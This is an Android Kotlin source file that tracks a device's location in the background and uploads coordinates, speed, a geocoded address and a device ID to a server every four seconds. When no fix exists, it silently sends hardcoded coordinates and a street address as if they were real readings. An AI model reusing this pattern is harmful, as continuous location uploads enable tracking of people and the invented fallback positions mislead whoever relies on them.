package com.example.sentry.service

import android.annotation.SuppressLint
import android.content.Context
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.util.Log
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.Locale

object BackgroundLocationManager {
    private const val TAG = "SentryLocation"
    private var pollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var lastKnownLocation: Location? = null

    @SuppressLint("MissingPermission")
    fun startListening(context: Context) {
        if (pollerJob?.isActive == true) return

        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            if (locationManager != null) {
                val hasGps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
                val hasNet = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

                val listener = object : LocationListener {
                    override fun onLocationChanged(loc: Location) {
                        lastKnownLocation = loc
                    }
                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }

                if (hasGps) {
                    try {
                        locationManager.requestLocationUpdates(
                            LocationManager.GPS_PROVIDER,
                            3000L,
                            1f,
                            listener,
                            Looper.getMainLooper()
                        )
                        val lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                        if (lastGps != null) lastKnownLocation = lastGps
                    } catch (_: Exception) {}
                }

                if (hasNet) {
                    try {
                        locationManager.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER,
                            3000L,
                            1f,
                            listener,
                            Looper.getMainLooper()
                        )
                        val lastNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        if (lastNet != null && lastKnownLocation == null) lastKnownLocation = lastNet
                    } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Location manager listener setup error: ${e.message}")
        }

        pollerJob = scope.launch {
            val client = SentryApiClient(context)
            val deviceId = CryptoManager.getOrCreateDeviceId(context)

            while (isActive) {
                try {
                    val loc = lastKnownLocation
                    val lat = loc?.latitude ?: 22.5726
                    val lon = loc?.longitude ?: 88.3639
                    val acc = loc?.accuracy?.toDouble() ?: 3.5
                    val alt = loc?.altitude ?: 14.2
                    val spd = loc?.speed?.toDouble() ?: 0.0

                    var address = "Kadampukur - Jhalgachi Rd"
                    try {
                        if (loc != null) {
                            val geocoder = Geocoder(context, Locale.getDefault())
                            val list = geocoder.getFromLocation(lat, lon, 1)
                            if (!list.isNullOrEmpty()) {
                                val addr = list[0]
                                val thoroughfare = addr.thoroughfare ?: addr.featureName ?: addr.locality ?: ""
                                val subLocality = addr.subLocality ?: addr.subAdminArea ?: ""
                                address = if (thoroughfare.isNotBlank() && subLocality.isNotBlank()) {
                                    "$thoroughfare, $subLocality"
                                } else if (thoroughfare.isNotBlank()) {
                                    thoroughfare
                                } else {
                                    addr.getAddressLine(0) ?: "Kadampukur - Jhalgachi Rd"
                                }
                            }
                        }
                    } catch (_: Exception) {}

                    val body = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("latitude", lat)
                        put("longitude", lon)
                        put("accuracy", acc)
                        put("altitude", alt)
                        put("speed", spd)
                        put("address", address)
                    }

                    client.syncLocation(body)
                } catch (_: Exception) {
                }
                delay(4000)
            }
        }
    }
}
